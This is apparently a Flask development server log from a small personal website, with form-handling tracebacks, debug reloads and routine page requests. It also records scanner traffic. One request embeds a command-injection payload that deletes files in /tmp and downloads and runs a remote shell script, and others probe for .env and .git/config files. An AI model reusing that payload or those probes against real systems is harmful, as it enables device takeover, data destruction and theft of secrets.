+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:46:14] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:46:15] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:46:15] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+184.147.170.168 - - [18/Jan/2024 16:46:15] "POST /testing HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1478, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1458, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1455, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 869, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 867, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 852, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/ubuntu/flaskcode/main.py", line 53, in testing
+    print("Request for mydata",request.form['mydata'])
+  File "/usr/local/lib/python3.10/dist-packages/werkzeug/datastructures/structures.py", line 192, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'mydata'
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+Request for mydata This is my data string
+Data of fname This is my data string
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:48:25] "POST /testing HTTP/1.1" 200 -
+ * Detected change in '/home/ubuntu/flaskcode/main.py', reloading
+testing123
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 193-793-228
+184.147.170.168 - - [18/Jan/2024 16:50:36] "POST /submit HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 16:50:36] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 16:51:51] "GET /index.html/ HTTP/1.1" 404 -
+208.98.222.119 - - [18/Jan/2024 16:51:52] "GET /favicon.ico HTTP/1.1" 404 -
+208.98.222.119 - - [18/Jan/2024 16:51:55] "GET /index.html/ HTTP/1.1" 404 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET / HTTP/1.1" 200 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /static/css/styles.css HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /js/scripts.js HTTP/1.1" 404 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 16:53:08] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 304 -
+209.171.88.231 - - [18/Jan/2024 17:07:21] "GET / HTTP/1.1" 200 -
+209.171.88.231 - - [18/Jan/2024 17:07:22] "GET /static/css/styles.css HTTP/1.1" 200 -
+209.171.88.231 - - [18/Jan/2024 17:07:22] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+209.171.88.231 - - [18/Jan/2024 17:07:22] "GET /js/scripts.js HTTP/1.1" 404 -
+209.171.88.231 - - [18/Jan/2024 17:07:23] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+209.171.88.231 - - [18/Jan/2024 17:07:23] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+209.171.88.231 - - [18/Jan/2024 17:07:24] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+193.118.51.146 - - [18/Jan/2024 17:39:11] "GET / HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /register HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 17:53:51] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET / HTTP/1.1" 200 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /static/css/styles.css HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 304 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /js/scripts.js HTTP/1.1" 404 -
+208.98.222.119 - - [18/Jan/2024 18:23:26] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+185.224.128.191 - - [18/Jan/2024 18:27:31] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20/tmp;%20rm%20-rf%20*;%20wget%20http://104.168.5.4/tenda.sh;%20chmod%20777%20tenda.sh;./tenda.sh) HTTP/1.1" 404 -
+192.241.217.37 - - [18/Jan/2024 19:03:26] "GET /ReportServer HTTP/1.1" 404 -
+172.225.44.85 - - [18/Jan/2024 19:12:56] "GET / HTTP/1.1" 200 -
+172.225.44.85 - - [18/Jan/2024 19:12:56] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+208.124.203.170 - - [18/Jan/2024 19:13:32] "GET / HTTP/1.1" 200 -
+208.124.203.170 - - [18/Jan/2024 19:13:39] "GET /static/css/styles.css HTTP/1.1" 200 -
+99.247.12.52 - - [18/Jan/2024 19:34:24] "GET /index.html/ HTTP/1.1" 404 -
+99.247.12.52 - - [18/Jan/2024 19:34:24] "GET /favicon.ico HTTP/1.1" 404 -
+146.75.188.2 - - [18/Jan/2024 20:02:28] "GET / HTTP/1.1" 200 -
+108.61.219.12 - - [18/Jan/2024 20:27:30] "GET / HTTP/1.0" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "POST /submit HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:29:53] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:30:48] "GET /submit HTTP/1.1" 405 -
+184.147.170.168 - - [18/Jan/2024 20:30:48] "GET /favicon.ico HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:31:02] "GET /submit HTTP/1.1" 405 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET / HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:49] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET / HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /static/css/styles.css HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:53] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:31:54] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "POST /submit HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:34:28] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "POST /submit HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/css/styles.css HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/assets/img/logo.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:36:12] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+185.254.196.186 - - [18/Jan/2024 20:40:05] "GET /.env HTTP/1.1" 404 -
+185.254.196.186 - - [18/Jan/2024 20:40:05] "POST / HTTP/1.1" 200 -
+198.199.97.30 - - [18/Jan/2024 20:40:06] "GET /druid/index.html HTTP/1.1" 404 -
+3.144.85.206 - - [18/Jan/2024 20:41:44] "GET /.git/config HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /register HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /static/css/styles.css HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:48:56] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET / HTTP/1.1" 200 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /static/css/styles.css HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /static/assets/img/logo.png HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /static/assets/img/praveen-casual.jpeg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /static/assets/img/prashanth-formal.jpg HTTP/1.1" 304 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /js/scripts.js HTTP/1.1" 404 -
+184.147.170.168 - - [18/Jan/2024 20:48:59] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 304 -
+69.164.217.245 - - [18/Jan/2024 20:51:02] "GET / HTTP/1.1" 200 -
+45.33.80.243 - - [18/Jan/2024 20:51:19] "GET / HTTP/1.1" 200 -
+52.177.249.187 - - [18/Jan/2024 21:06:11] "GET / HTTP/1.1" 200 -
+167.248.133.188 - - [18/Jan/2024 21:06:56] "GET / HTTP/1.1" 200 -
+167.248.133.188 - - [18/Jan/2024 21:07:06] code 505, message Invalid HTTP version (2.0)
+167.248.133.188 - - [18/Jan/2024 21:07:06] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.248.133.188 - - [18/Jan/2024 21:07:07] "GET /static/assets/img/logo-no-text.png HTTP/1.1" 200 -
+167.248.133.188 - - [18/Jan/2024 21:07:07] "GET /favicon.ico HTTP/1.1" 404 -
